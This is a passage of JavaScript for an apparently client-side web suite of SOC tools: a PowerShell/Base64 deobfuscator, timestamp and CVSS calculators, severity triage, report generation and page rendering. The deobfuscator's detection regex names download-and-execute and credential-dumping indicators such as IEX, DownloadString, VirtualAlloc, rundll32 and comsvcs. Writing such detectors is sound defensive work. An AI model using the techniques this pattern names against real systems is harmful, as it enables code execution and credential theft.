        <pre style="margin:0;color:#38bdf8;font-family:'JetBrains Mono',monospace;font-size:0.8rem;white-space:pre-wrap;">${esc(compiled)}</pre>
      `;
    }

    if (tool.id === "deobfuscator") {
      let decoded = input;
      let method = "URL / Plaintext Unescape";
      const b64 = input.match(/-enc(?:odedcommand)?\s+([A-Za-z0-9+/=]+)/i) || input.match(/([A-Za-z0-9+/=]{20,})/);
      if (b64) {
        try {
          const raw = atob(b64[1]);
          method = raw.includes("\x00") ? "UTF-16LE PowerShell Base64" : "Standard Base64";
          decoded = raw.replace(/\x00/g, "");
        } catch (e) {}
      } else {
        try { decoded = decodeURIComponent(input); } catch (e) {}
      }
      const alerts = Array.from(new Set(decoded.match(/IEX|Invoke-Expression|DownloadString|WebClient|FromBase64String|VirtualAlloc|rundll32|comsvcs|https?:\/\/[^\s'"]+/gi) || []));
      return `
        <table class="psv-out-table">
          <thead><tr><th>Analysis Stage</th><th>Result</th></tr></thead>
          <tbody>
            <tr><td>Detected Encoding</td><td style="color:#fbbf24;font-weight:700;">${esc(method)}</td></tr>
            <tr><td>De-obfuscated Plaintext</td><td style="color:#38bdf8;font-weight:600;">${esc(decoded)}</td></tr>
            <tr><td>Extracted Indicators / APIs</td><td style="color:#f87171;font-weight:700;">${esc(alerts.map(defang).join(" , ") || "None flagged")}</td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "json") {
      try {
        const obj = JSON.parse(input);
        const flat = {};
        (function flatten(curr, prop) {
          if (Object(curr) !== curr) {
            flat[prop] = curr;
          } else if (Array.isArray(curr)) {
            flat[prop] = JSON.stringify(curr);
          } else {
            for (const p in curr) flatten(curr[p], prop ? prop + "." + p : p);
          }
        })(obj, "");

        return `
          <table class="psv-out-table" style="margin-bottom:1rem;">
            <thead><tr><th>Flattened ECS / SIEM Field Path</th><th>Extracted Value</th></tr></thead>
            <tbody>${Object.keys(flat).map(k => `<tr><td style="color:#38bdf8;font-weight:600;">${esc(k)}</td><td>${esc(flat[k])}</td></tr>`).join("")}</tbody>
          </table>
          <pre style="margin:0;color:#cbd5e1;font-family:'JetBrains Mono',monospace;font-size:0.78rem;">${esc(JSON.stringify(obj, null, 2))}</pre>
        `;
      } catch (err) {
        return `<div style="color:#f87171;">JSON Syntax Error: ${esc(err.message)}</div>`;
      }
    }

    if (tool.id === "timestamp") {
      let d;
      if (/^\d{10}$/.test(input)) d = new Date(parseInt(input, 10) * 1000);
      else if (/^\d{13}$/.test(input)) d = new Date(parseInt(input, 10));
      else if (/^\d{18}$/.test(input)) d = new Date(Number(BigInt(input) / 10000n - 11644473600000n));
      else d = new Date(input);

      if (isNaN(d.getTime())) return `<div style="color:#f87171;">Invalid timestamp format: ${esc(input)}</div>`;
      const sec = Math.floor(d.getTime() / 1000);
      const ms = d.getTime();
      const ft = (BigInt(ms) + 11644473600000n) * 10000n;
      return `
        <table class="psv-out-table">
          <thead><tr><th>Timestamp Representation</th><th>Converted Value</th></tr></thead>
          <tbody>
            <tr><td>ISO-8601 (UTC)</td><td style="color:#38bdf8;font-weight:700;">${esc(d.toISOString())}</td></tr>
            <tr><td>UTC String</td><td>${esc(d.toUTCString())}</td></tr>
            <tr><td>Analyst Local Time</td><td>${esc(d.toString())}</td></tr>
            <tr><td>Unix Epoch (Seconds)</td><td>${sec}</td></tr>
            <tr><td>Unix Epoch (Milliseconds)</td><td>${ms}</td></tr>
            <tr><td>Windows FileTime / LDAP (18-digit)</td><td>${ft.toString()}</td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "severity") {
      let score = 20;
      if (/tier1_dc|domain_controller|critical/i.test(input)) score += 30;
      else if (/server|production/i.test(input)) score += 15;
      if (/regulated_pii|pci|hipaa|secret/i.test(input)) score += 20;
      if (/multi_host_lateral|domain_wide/i.test(input)) score += 15;
      if (/active_c2_exfil|ransomware/i.test(input)) score += 15;
      if (/domain_admin|root|system/i.test(input)) score += 10;
      score = Math.min(100, score);
      const p = score >= 85 ? "P1 — Critical (SLA: 15 mins)" : score >= 65 ? "P2 — High (SLA: 1 hour)" : score >= 40 ? "P3 — Medium (SLA: 4 hours)" : "P4 — Low (SLA: 24 hours)";

      return `
        <table class="psv-out-table">
          <thead><tr><th>Metric</th><th>Calculated Result</th></tr></thead>
          <tbody>
            <tr><td>Incident Priority & SLA</td><td style="color:${score >= 85 ? "#f87171" : "#fbbf24"};font-weight:800;">${esc(p)}</td></tr>
            <tr><td>Composite Triage Risk Score</td><td style="color:#38bdf8;font-weight:700;">${score} / 100</td></tr>
            <tr><td>Mandatory Containment Actions</td><td>1. Isolate affected host(s) in EDR immediately.<br>2. Revoke active session tokens & Kerberos TGTs.<br>3. Block external C2 indicators at firewall/DNS.</td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "report") {
      const getVal = k => ((input.match(new RegExp(k + "::([\\s\\S]*?)(?=\\n[A-Z_]+::|$)", "i")) || [])[1] || "").trim();
      const md = `# SOC INCIDENT REPORT — ${getVal("INCIDENT_ID") || "INC-2026"}\n**Title:** ${getVal("TITLE")}\n**Severity:** ${getVal("SEVERITY")}\n**Detection Source:** ${getVal("DETECTION_SOURCE")}\n\n## 1. Affected Assets\n${getVal("AFFECTED_ASSETS")}\n\n## 2. MITRE ATT&CK Tactics & Techniques\n${getVal("MITRE_TACTICS")}\n\n## 3. Investigation Timeline (UTC)\n${getVal("TIMELINE")}\n\n## 4. Defanged Indicators of Compromise\n${defang(getVal("IOCS"))}\n\n## 5. Containment & Eradication Actions\n${getVal("CONTAINMENT")}`;
      return `<pre style="margin:0;color:#38bdf8;font-family:'JetBrains Mono',monospace;font-size:0.8rem;white-space:pre-wrap;">${esc(md)}</pre>`;
    }

    if (tool.id === "cvss") {
      const m = {};
      input.split("/").forEach(p => {
        const kv = p.split(":");
        if (kv.length === 2) m[kv[0].toUpperCase()] = kv[1].toUpperCase();
      });
      const av = { N: 0.85, A: 0.62, L: 0.55, P: 0.2 }[m.AV] || 0.85;
      const ac = { L: 0.77, H: 0.44 }[m.AC] || 0.77;
      const sc = m.S === "C";
      const pr = (sc ? { N: 0.85, L: 0.68, H: 0.5 } : { N: 0.85, L: 0.62, H: 0.27 })[m.PR] ?? 0.85;
      const ui = { N: 0.85, R: 0.62 }[m.UI] || 0.85;
      const c = { H: 0.56, L: 0.22, N: 0 }[m.C] ?? 0.56;
      const i = { H: 0.56, L: 0.22, N: 0 }[m.I] ?? 0.56;
      const a = { H: 0.56, L: 0.22, N: 0 }[m.A] ?? 0.56;

      const iss = 1 - (1 - c) * (1 - i) * (1 - a);
      const impact = sc ? 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15) : 6.42 * iss;
      const exploit = 8.22 * av * ac * pr * ui;
      const roundUp = v => Math.ceil(Math.round(v * 100000) / 10000) / 10;
      const base = iss <= 0 ? 0 : roundUp(Math.min(sc ? 1.08 * (impact + exploit) : impact + exploit, 10));

      const eW = { X: 1, H: 1, F: 0.97, P: 0.94, U: 0.91 }[m.E] || 1;
      const rlW = { X: 1, U: 1, W: 0.97, T: 0.96, O: 0.95 }[m.RL] || 1;
      const rcW = { X: 1, C: 1, R: 0.96, U: 0.92 }[m.RC] || 1;
      const temporal = roundUp(base * eW * rlW * rcW);

      const crW = { X: 1, H: 1.5, M: 1.0, L: 0.5 }[m.CR] || 1;
      const irW = { X: 1, H: 1.5, M: 1.0, L: 0.5 }[m.IR] || 1;
      const arW = { X: 1, H: 1.5, M: 1.0, L: 0.5 }[m.AR] || 1;
      const miss = Math.min(1 - (1 - c * crW) * (1 - i * irW) * (1 - a * arW), 0.915);
      const mImpact = sc ? 7.52 * (miss - 0.029) - 3.25 * Math.pow(miss * 0.9731 - 0.02, 13) : 6.42 * miss;
      const env = iss <= 0 ? 0 : roundUp(roundUp(Math.min(sc ? 1.08 * (mImpact + exploit) : mImpact + exploit, 10)) * eW * rlW * rcW);
      const rating = s => (s >= 9.0 ? "CRITICAL" : s >= 7.0 ? "HIGH" : s >= 4.0 ? "MEDIUM" : s > 0 ? "LOW" : "NONE");

      return `
        <table class="psv-out-table">
          <thead><tr><th>CVSS v3.1 Metric Group</th><th>Calculated Score</th><th>Severity Rating</th><th>Sub-Score Details</th></tr></thead>
          <tbody>
            <tr><td><strong>Base Score</strong></td><td style="color:#f87171;font-weight:800;font-size:0.95rem;">${base.toFixed(1)} / 10.0</td><td>${rating(base)}</td><td>Impact: ${impact.toFixed(2)} | Exploitability: ${exploit.toFixed(2)}</td></tr>
            <tr><td><strong>Temporal Score</strong></td><td style="color:#fbbf24;font-weight:800;font-size:0.95rem;">${temporal.toFixed(1)} / 10.0</td><td>${rating(temporal)}</td><td>E:${m.E || "X"} | RL:${m.RL || "X"} | RC:${m.RC || "X"}</td></tr>
            <tr><td><strong>Environmental Score</strong></td><td style="color:#38bdf8;font-weight:800;font-size:0.95rem;">${env.toFixed(1)} / 10.0</td><td>${rating(env)}</td><td>CR:${m.CR || "X"} | IR:${m.IR || "X"} | AR:${m.AR || "X"}</td></tr>
          </tbody>
        </table>
      `;
    }

    return "";
  }

  function renderCatalogView(root) {
    const filtered = TOOLS.filter(t => {
      const catOk = activeCat === "all" || t.cat === activeCat;
      const qOk = !searchQuery || t.title.toLowerCase().includes(searchQuery) || t.desc.toLowerCase().includes(searchQuery);
      return catOk && qOk;
    });

    root.innerHTML = `
      <div id="psv-app">
        <div class="psv-hero-split">
          <div>
            <div class="psv-eyebrow">// INTERACTIVE SECURITY TOOLS</div>
            <h1 class="psv-hero-h1">Free <span>Security Tools</span><br>Built for Defenders.</h1>
            <p class="psv-hero-desc">13 privacy-first SOC, threat intelligence, DFIR, and detection engineering tools. Everything runs locally in your browser with zero data logged.</p>
            <div class="psv-stats-bar">
              <div class="psv-stat-cell"><div class="psv-stat-val">13</div><div class="psv-stat-lbl">Security Tools</div></div>
              <div class="psv-stat-cell"><div class="psv-stat-val">0</div><div class="psv-stat-lbl">Data Logged</div></div>
              <div class="psv-stat-cell"><div class="psv-stat-val">100%</div><div class="psv-stat-lbl">Client-Side</div></div>
            </div>
          </div>

          <div class="psv-preview-box">
            <div class="psv-preview-top">
              <span>PSV // QUICK-LAUNCH MATRIX</span>
              <span>CLICK TO OPEN</span>
            </div>
            <div class="psv-preview-mini-grid">
              ${TOOLS.slice(0, 9).map(t => `
                <button type="button" class="psv-mini-tile" data-psv-action="open-tool" data-tool="${esc(t.id)}">
                  <span>[${esc(t.badge)}]</span>${esc(t.shortTitle)}
                </button>
              `).join("")}
            </div>
          </div>
        </div>

        <div class="psv-catalog-window">
          <div class="psv-window-bar">
            <div class="psv-window-dots">
              <span class="psv-dot"></span><span class="psv-dot"></span><span class="psv-dot"></span>
              <span style="margin-left:0.5rem;">PSV // SECURITY-TOOLS-CATALOG</span>
            </div>
            <span>13 TOOLS · ZERO DATA LOGGED · CLIENT-SIDE</span>
          </div>

          <div class="psv-catalog-body">
            <input type="search" id="psv-cat-search" class="psv-search-bar" placeholder="Search 13 tools (e.g. ioc, sigma, sysmon, yara, phishing, cvss, timestamp)..." value="${esc(searchQuery)}" />

            <div class="psv-cat-pills">
              ${CATEGORIES.map(c => {
                const count = c.id === "all" ? TOOLS.length : TOOLS.filter(t => t.cat === c.id).length;
                return `<button type="button" class="psv-pill ${activeCat === c.id ? "active" : ""}" data-psv-action="set-cat" data-cat="${esc(c.id)}">${esc(c.label)} (${count})</button>`;
              }).join("")}
            </div>

            <div class="psv-cards-grid">
              ${filtered.map(t => `
                <div class="psv-tool-card" role="button" tabindex="0" data-psv-action="open-tool" data-tool="${esc(t.id)}">
                  <div>
                    <div class="psv-card-head">
                      <span class="psv-card-badge">${esc(t.badge)}</span>
                      <span class="psv-card-cat-lbl">${esc(t.cat.toUpperCase())}</span>
                    </div>
                    <h3 class="psv-card-title">${esc(t.title)}</h3>
                    <p class="psv-card-desc">${esc(t.desc)}</p>
                  </div>
                  <div class="psv-card-foot">
                    <span class="psv-client-tag">● Client-Side</span>
                    <span class="psv-open-link">Open Tool →</span>
                  </div>
                </div>
              `).join("")}
            </div>
          </div>
        </div>
      </div>
    `;
  }

  function renderSingleToolView(root) {
    const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
    const currentInput = userInputs[tool.id] !== undefined ? userInputs[tool.id] : tool.sample;
    const relatedTools = (tool.related || []).map(rid => TOOLS.find(t => t.id === rid)).filter(Boolean);

    root.innerHTML = `
      <div id="psv-app">
        <div class="psv-tool-page">
          <div class="psv-back-bar">
            <button type="button" class="psv-back-btn" data-psv-action="back-catalog">← Back to All Security Tools (13)</button>
            <div style="display:flex;gap:0.4rem;flex-wrap:wrap;">
              ${TOOLS.map(t => `<button type="button" class="psv-opt-pill ${t.id === tool.id ? "active" : ""}" style="padding:0.28rem 0.6rem;font-size:0.71rem;" data-psv-action="open-tool" data-tool="${esc(t.id)}">${esc(t.badge)}</button>`).join("")}
            </div>
          </div>

          <div class="psv-tool-hero">
            <div class="psv-tool-hero-icon">${esc(tool.badge)}</div>
            <h1>${esc(tool.title)}</h1>
            <p>${esc(tool.desc)}</p>
            <div class="psv-hero-badges">
              <span class="psv-pill-badge">🛡️ 100% Client-Side Execution</span>
              <span class="psv-pill-badge">🔒 Zero Data Leaves Your Browser</span>
            </div>
          </div>

          <div class="psv-terminal-box">
            <div class="psv-window-bar">
              <div class="psv-window-dots">
                <span class="psv-dot"></span><span class="psv-dot"></span><span class="psv-dot"></span>
                <span style="margin-left:0.5rem;">PSV // ${esc(tool.id.toUpperCase())}-WORKBENCH</span>
              </div>
              <span>ACTIVE WORKSPACE</span>
            </div>

            <div class="psv-term-body">
              <div class="psv-privacy-strip">
                🔒 <strong>Privacy Guarantee:</strong> All parsing, decoding, and rule compilation runs locally in your browser memory.
              </div>

              <div class="psv-field-label">
                <span>INPUT TELEMETRY / PAYLOAD (EDIT BELOW OR CLICK A PRESET PILL)</span>
                <span>REAL-TIME ENGINE</span>
              </div>
              <textarea id="psv-tool-editor" class="psv-editor" spellcheck="false">${esc(currentInput)}</textarea>

              <div class="psv-action-bar">
                <div class="psv-opt-group">
                  ${(tool.options || []).map((opt, idx) => `
                    <button type="button" class="psv-opt-pill ${selectedOptionIdx === idx ? "active" : ""}" data-psv-action="set-opt" data-opt="${idx}">${esc(opt)}</button>
                  `).join("")}
                </div>

                <div class="psv-btn-group">
                  <button type="button" class="psv-btn-run" data-psv-action="run-tool">⚡ ${esc(tool.actionLabel)}</button>
                  <button type="button" class="psv-btn-util" data-psv-action="load-sample">Reset Sample</button>
                  <button type="button" class="psv-btn-util" data-psv-action="copy-output">${copyFeedback ? "✓ Copied!" : "Copy Output"}</button>
                  <button type="button" class="psv-btn-util" data-psv-action="clear-tool">Clear</button>
                </div>
              </div>

              <div class="psv-field-label">
                <span>COMPUTED ANALYSIS OUTPUT</span>
              </div>
              <div id="psv-tool-result-box" class="psv-output-container">
                ${computeDynamicOutput(tool, currentInput)}
              </div>
            </div>
          </div>

          <div class="psv-doc-section">
            <h3>What this tool does</h3>
            <p>${esc(tool.whatItDoes)}</p>
          </div>

          <div class="psv-doc-section">
            <h3>Why it matters</h3>
            <p>${esc(tool.whyItMatters)}</p>
          </div>

          <div class="psv-doc-section">
            <h3>How it works</h3>
            <p>${esc(tool.howItWorks)}</p>
          </div>

          <div class="psv-doc-section">
            <h3>Best practices</h3>
            <ul>
              ${(tool.bestPractices || []).map(bp => `<li>${esc(bp)}</li>`).join("")}
            </ul>
          </div>

          <div class="psv-doc-section">
            <h3>Frequently Asked Questions</h3>
            ${(tool.faqs || []).map(f => `
              <details class="psv-faq-item">
                <summary>${esc(f.q)}</summary>
                <p>${esc(f.a)}</p>
              </details>
            `).join("")}
          </div>

          <div class="psv-doc-section">
            <h3>Related Security Tools</h3>
            <div class="psv-related-grid">
              ${relatedTools.map(rt => `
                <div class="psv-tool-card" role="button" tabindex="0" data-psv-action="open-tool" data-tool="${esc(rt.id)}">
                  <div>
                    <div class="psv-card-head">
                      <span class="psv-card-badge">${esc(rt.badge)}</span>
                    </div>
                    <h4 class="psv-card-title" style="font-size:0.92rem;">${esc(rt.title)}</h4>
                    <p class="psv-card-desc" style="font-size:0.75rem;margin-bottom:0.5rem;">${esc(rt.desc)}</p>
                  </div>
                  <span class="psv-open-link" style="font-size:0.74rem;">Open Tool →</span>
                </div>
              `).join("")}
            </div>
          </div>
        </div>
      </div>
    `;
  }

  function render() {
    injectStyles();
    const root = getRoot();
    if (!root) return;
    if (currentView === "tool") {
      renderSingleToolView(root);
    } else {
      renderCatalogView(root);
    }
  }

  /* === CAPTURE-PHASE GLOBAL EVENT LISTENER (Cannot be blocked by MkDocs Material) === */
  if (!window.__psvCaptureBound) {
    window.__psvCaptureBound = true;

    window.addEventListener("click", function (e) {
      const target = e.target && e.target.closest ? e.target.closest("[data-psv-action]") : null;
      if (!target) return;

      e.preventDefault();
      e.stopPropagation();

      const action = target.getAttribute("data-psv-action");

      if (action === "open-tool") {
        const tid = target.getAttribute("data-tool");
        if (tid) {
          activeToolId = tid;
          selectedOptionIdx = 0;
          currentView = "tool";
          try { history.pushState({ tool: tid }, "", "#tool/" + tid); } catch (err) {}
          render();
          window.scrollTo({ top: 0, behavior: "smooth" });
        }
      } else if (action === "back-catalog") {
        currentView = "catalog";
        try { history.pushState({}, "", window.location.pathname); } catch (err) {}
        render();
        window.scrollTo({ top: 0, behavior: "smooth" });
      } else if (action === "set-cat") {
        activeCat = target.getAttribute("data-cat") || "all";
        render();
      } else if (action === "set-opt") {
        const idx = parseInt(target.getAttribute("data-opt") || "0", 10);
        selectedOptionIdx = idx;
        const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
        applyPresetOption(tool, idx);
        render();
      } else if (action === "run-tool") {
        const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
        const ed = document.getElementById("psv-tool-editor");
        const out = document.getElementById("psv-tool-result-box");
        if (ed && out) {
          if (!ed.value.trim()) ed.value = tool.sample;
          userInputs[tool.id] = ed.value;
          out.innerHTML = computeDynamicOutput(tool, ed.value);
        }
      } else if (action === "load-sample") {
        const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
        selectedOptionIdx = 0;
        userInputs[tool.id] = tool.sample;
        render();
      } else if (action === "clear-tool") {
        const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
        userInputs[tool.id] = "";
        const ed = document.getElementById("psv-tool-editor");
        const out = document.getElementById("psv-tool-result-box");
        if (ed) ed.value = "";
        if (out) out.innerHTML = `<div style="color:#94a3b8;padding:0.5rem;">Workspace cleared. Click <strong>Reset Sample</strong> or paste your own telemetry above.</div>`;
      } else if (action === "copy-output") {
        const out = document.getElementById("psv-tool-result-box");
        if (out && navigator.clipboard) {
          navigator.clipboard.writeText(out.innerText);
          copyFeedback = true;
          render();
          setTimeout(() => { copyFeedback = false; render(); }, 1500);
        }
      } else if (action === "pivot-ti") {
        const ind = target.getAttribute("data-indicator") || "1.1.1.1";
        activeToolId = "ti";
        userInputs.ti = ind;
        selectedOptionIdx = 0;
        currentView = "tool";
        render();
        window.scrollTo({ top: 0, behavior: "smooth" });
      }
    }, true);

    window.addEventListener("input", function (e) {
      if (e.target && e.target.id === "psv-cat-search") {
        searchQuery = e.target.value.toLowerCase();
        const pos = e.target.selectionStart || searchQuery.length;
        render();
        const restored = document.getElementById("psv-cat-search");
        if (restored) {
          restored.focus();
          restored.setSelectionRange(pos, pos);
        }
      } else if (e.target && e.target.id === "psv-tool-editor") {
        const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
        userInputs[tool.id] = e.target.value;
        const out = document.getElementById("psv-tool-result-box");
        if (out) out.innerHTML = computeDynamicOutput(tool, e.target.value);
      }
    }, true);

    window.addEventListener("popstate", function () {
      const h = window.location.hash || "";
      if (h.startsWith("#tool/")) {
        const id = h.replace("#tool/", "").trim();
        if (TOOLS.some(t => t.id === id)) {
          activeToolId = id;
          currentView = "tool";
          render();
          return;
        }
      }
      currentView = "catalog";
      render();
    });
  }

  function init() {
    const h = window.location.hash || "";
    if (h.startsWith("#tool/")) {
      const id = h.replace("#tool/", "").trim();
      if (TOOLS.some(t => t.id === id)) {
        activeToolId = id;
        currentView = "tool";
      }
    }
    render();
  }

  if (typeof document$ !== "undefined") {
    document$.subscribe(() => init());
  } else if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();